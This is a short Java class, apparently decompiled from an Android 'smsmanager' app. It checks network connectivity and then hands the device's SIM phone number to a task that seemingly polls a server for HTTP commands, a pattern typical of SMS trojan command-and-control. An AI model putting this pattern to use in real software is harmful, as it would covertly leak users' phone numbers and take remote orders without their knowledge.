package cn.smsmanager.internet;

import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo.State;
import android.util.Log;
import cn.smsmanager.tools.FileLog;
import cn.smsmanager.tools.ParamsInfo;

public final class ScanNetWorkSateTask implements Runnable {
    private final String TAG = "ScanNetWorkSateTask";

    public void run() {
        try {
            Log.i("ScanNetWorkSateTask", "doing");
            boolean canSend = false;
            try {
                ConnectivityManager connectivity = (ConnectivityManager) ParamsInfo.context.getSystemService("connectivity");
                if (connectivity != null) {
                    NetworkInfo info = connectivity.getActiveNetworkInfo();
                    if (info != null && info.isConnected() && info.getState() == State.CONNECTED) {
                        canSend = true;
                    }
                }
            } catch (Exception e) {
                FileLog.LogString("ScanNetWorkSateTask:canSendError" + e.toString());
                e.printStackTrace();
            }
            if (canSend) {
                Log.i("ScanNetWorkSateTask", "canSend = true");
            } else {
                Log.i("ScanNetWorkSateTask", "canSend = false");
            }
            if (canSend) {
                try {
                    Log.d("ScanNetWorkSateTask", "put sim_no to ScanHttpCmdTask: " + ParamsInfo.Line1Number);
                    new ScanHttpCmdTask(ParamsInfo.context, ParamsInfo.Line1Number).DoTask();
                } catch (Exception ex) {
                    FileLog.LogString("ScanNetWorkSateTask:scanHttpCmdTaskError " + ex.toString());
                }
            }
        } catch (Exception e2) {
            FileLog.LogString("ScanNetWorkSateTask:" + e2.toString());
        }
    }
}
